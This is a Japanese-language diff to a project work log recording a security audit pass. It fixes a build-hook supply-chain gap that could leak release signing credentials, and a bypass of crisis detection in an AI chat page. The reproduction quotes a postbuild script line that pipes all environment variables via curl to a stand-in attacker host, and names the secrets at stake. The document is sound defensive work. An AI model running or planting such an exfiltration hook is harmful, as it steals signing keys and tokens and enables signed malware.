@@ -1,5 +1,38 @@
 # Service Hub — 残りの作業手順書
 
+## パス 514 (狩りの 4 回目 —— 5 面を監査役に並行で走らせ、確認した本物だけ直す) (2026-10-13)
+
+5 面 (main-ipc / renderer / network / ai / supply-chain) を監査役 (read-only・high) に並行で走らせ、**指摘を自分で再現してから**本物だけ直した。報告は network / main-ipc / renderer = 0 件、ai = 1 件、supply-chain = 1 件。再現で 2 件とも本物と確認。
+
+### T-016 (供給網・medium) —— 直下の新規 `.cjs` + `postbuild` で release の署名鍵まで任意コードが通る
+
+- **再現 (実測 2026-10-13・直す前)**: リポジトリ直下に `postbuild.cjs` (`require('node:child_process').execSync('env | curl -s --data-binary @- https://evil.example/collect')`) を置き (git add)、`package.json` に `"postbuild": "node postbuild.cjs"` を 1 行足すと —— `lint:malware` / `lint:forbidden` / `lint:network-targets` / `lint:deps` の **4 門すべて exit 0**。`npm run build` は npm の慣習で prebuild→build→postbuild を自動で走らせ、`release.yml` の Build (`npm run build -- --publish never`) の env は `CSC_LINK / CSC_KEY_PASSWORD / APPLE_ID / APPLE_APP_SPECIFIC_PASSWORD / APPLE_TEAM_ID / GH_TOKEN`。→ 公開者の署名証明書と公証資格情報が流出し、以後その証明書でマルウェアに正規署名できる。ci.yml は `build:web` だけなので **PR の CI は緑のまま、release タグを切った瞬間にだけ発火**。
+- **門が見なかった理由 (各行を実測)**: `lint:malware` の `trackedFiles()` は `/^(src|scripts|orchestration)\//` で濾す (直下は外れる)。`lint:forbidden` の `SCAN_FILES` は固定 4 本の名指し (新規の直下 `.cjs` は入らない —— パス 347 の docblock 自身が「直下はどの根にも入らない」と書いていた)。`lint:network-targets③` は `fetch` 一族しか見ず child_process/curl は対象外。`lint:deps` 規則 8 の `LIFECYCLE_KEYS` は install フック (preinstall/…/postpack) だけで `prebuild`/`postbuild`/`build` を含まない。T-003 (保護対象を触る) とも T-014 (install フックの `node -e`) とも別の継ぎ目。
+- **直し (3 門)**: ① `lint:malware` の走査母集団を純関数 `isScannedPath` へ出し、**追跡された直下の実行コード** (`.cjs/.mjs/.js/.ts/.tsx`・巨大なデータ JSON は外す) を含める ② `lint:forbidden` の直下走査を固定の `SCAN_FILES` から **git ls-files に聞く `rootCodeFiles()`** へ (本体の `main()` と self-test の `realVisited()` を揃える・git 無し環境では `SCAN_FILES` へ落ちる) ③ `lint:deps` の `LIFECYCLE_KEYS` に `prebuild`/`postbuild` を足し、文面は build 時の発火と署名鍵を名乗る (今日 0 件)。`lint:network-targets③` が既に git ls-files 全体で直下を含むのと同じ形。
+- **直した後 (同じ再現)**: `lint:forbidden` が `postbuild.cjs:1 [child_process exec/spawn]` で exit 1、`lint:deps` が `"postbuild" は npm run build のたびに自動で走ります (… 署名鍵を env に持つ)` で exit 1。**2 つの独立した門が捕まえる**。Fix 1 (lint:malware 直下走査) は、直下 `.cjs` の `fetch`+`process.env` を env-exfiltration で捕まえることを別に実測。
+- **残した物 (測った)**: 純粋な `child_process`+`curl` (Node の fetch/process.env を使わないシェル経由の送出) は `lint:malware` の規則では捕まらない (走査場所でも) —— lint:forbidden の child_process census・直下の走査・build フックの台帳が重なって塞ぐが、規則そのものの網羅ではない。`gaps` に記録。
+- **回帰**: `installTimeCodeGuarded.test.ts` (prebuild/postbuild・`threat: T-016`) / `malwareGate.test.ts` (`isScannedPath`・直下コードを走査) / `rootConfigScanned.test.ts` (`rootCodeFiles` が動的・合成一覧で新規直下 `.cjs` が入り入れ子/データ JSON は入らない)。対照はすべて実測 (直す前は 4 門 exit 0 / 直した後は 2 門 exit 1)。
+
+### AI の危機バイパス (安全ネットの欠陥 —— 攻撃ではないので脅威台帳には載せない)
+
+- **再現 (実測・自分で確かめた)**: `AssistantPage.send()` (`:583`) は `if (!hub) { replyOffline(text); return; }` の後、best3 / 全AI合議 / chat のどれも**危機判定を一切通さず** `hub.invoke('assistant','chat', …)` へ直行し、モデルの返答を描く。決定論の危機対応 (`replyOffline` → `chatbot.replyTo` が `detectCrisis || detectHarmToOthers` を**無条件で最初に**判定し `counseling.SUPPORT_RESOURCES` —— いのちの電話 / 119・110 —— を本文へ展開) が走るのは、ハブ不在・invoke 失敗・例外の枝だけ。**オンラインで正常に応答が返る限り、確証済みの窓口は決定論では一切出ず、モデルがどう答えるかに委ねられていた**。モデルは端末内 Ollama / 利用者が設定した互換 API / クラウドのどれでもよく、どれも窓口を出す保証を持たない。
+- **対照**: コンシェルジュ (ChatbotWidget → `chatbot.replyTo`) はこの穴を持たない —— 危機を最初に判定し、危機メッセージ (`kind: 'counsel'`) は LLM へ 1 度も届かない。旗艦 AI 画面だけがオンライン経路でこのネットを迂回していた非対称。
+- **直し**: `send()` の `try` 冒頭 (hub 取得より前) で `detectCrisis(text) || detectHarmToOthers(text)` を判定し、該当すれば `replyOffline(text)` (決定論・危機最優先) へ回して**モデルへ送らない** —— コンシェルジュと同じ安全思想。普通の質問は今までどおりモデルへ届く (直しは危機・他害の語だけ)。
+- **なぜ脅威台帳に載せないか**: これは敵のいない**安全ネットの欠陥**で、台帳の class (攻撃の型) のどれにも当てはまらない。通常の安全回帰テストとして留め、`threat: T-xxx` の印は付けない。
+- **回帰**: `assistantCrisisDeterministic.test.ts` —— 危機語で確証済みの窓口が出て `invoke('chat')` が 0 回・普通の質問はモデルへ届く。対照: 直しを無効化すると危機の 2 件が 5 秒で時間切れ (窓口が出ず、モデルの応答が描かれていた) = 空の検査ではない。
+
+### 0 件だった 3 面 (実測の健全理由を `clearedBacklog` に記録)
+
+- **renderer** —— `AssistantPage` の `theme.bg` / `theme.fg` が素で `background:` / `color:` へ入る (theme.image は `safeCssUrl` を通るのに) 非対称。新規の到達可能な実害ではない: `bg=url()` でビーコン GET が飛ぶとしても門を通る `image` 経由で既に可能 (`safeCssUrl`→`safeImageSrc` は利用者自身の値として任意 https を意図的に通す・CSP も `img-src https:`)。`url()` を書き込むスクリプト経路は無い。能力を増やさない hardening なので投機的に足さない。
+- **network** —— `scanTarget.looksInternalHostname` が `privateTarget.ts` より網が狭い (v6 の一部・TEST-NET を見ない)。VirusTotal 送信前の advisory で止める門ではなく (T-013 と同じ家系)、実際に SSRF を塞ぐ `privateTarget.ts` は網羅済み。直近 T-008〜T-013 が network をちょうど掃いた直後。
+- **main-ipc** —— T-001 / T-002 / T-012 で過去の指摘は閉じ済み。15 の IPC ハンドラの引数は `isServiceId` → `Object.hasOwn`・`isSafeExportPath`→`assertExportTargetContained`・`checkTokenInput`・`clientIdOverride` の形制約で守られている。
+
+### 検証 (最終コード)
+
+- `typecheck` 緑・`npm test` **1055 ファイル / 21334 件**・`verify:all` exit 0 (39 門・`verify:arch` のユニットテスト数を 17621 → **17635** へ)・`chain:verify` 緑 (block 289・保護対象 99・変更した 3 門と AssistantPage は保護対象ではない)。
+- 成果物: FULL **11,875,051 B** / LITE **3,287,675 B** (shipping の変更は AssistantPage の危機判定ブロックのみ・3 門と検査は出荷物に入らない)。
+- 実機: `perf` OK (LITE DCL 290 ms / heap 9.5 MB・FULL DCL 866 ms / heap 36.2 MB)・`e2e` **758 件 ❌ 0**・`e2e:lite` **758 件 ❌ 0**。`smoke:app` は回していない (主プロセスを触っていない)・`e2e:ollama` は回していない (Ollama の経路を触っていない)。
+
 ## パス 513 (狩りの 3 回目 —— 5 面を監査役に並行で走らせ、確認した本物だけ直す) (2026-10-13)
 
 5 面 (main-ipc / renderer / network / ai / supply-chain) を監査役 (read-only・high) に並行で走らせ、**指摘を自分で再現してから**直した。
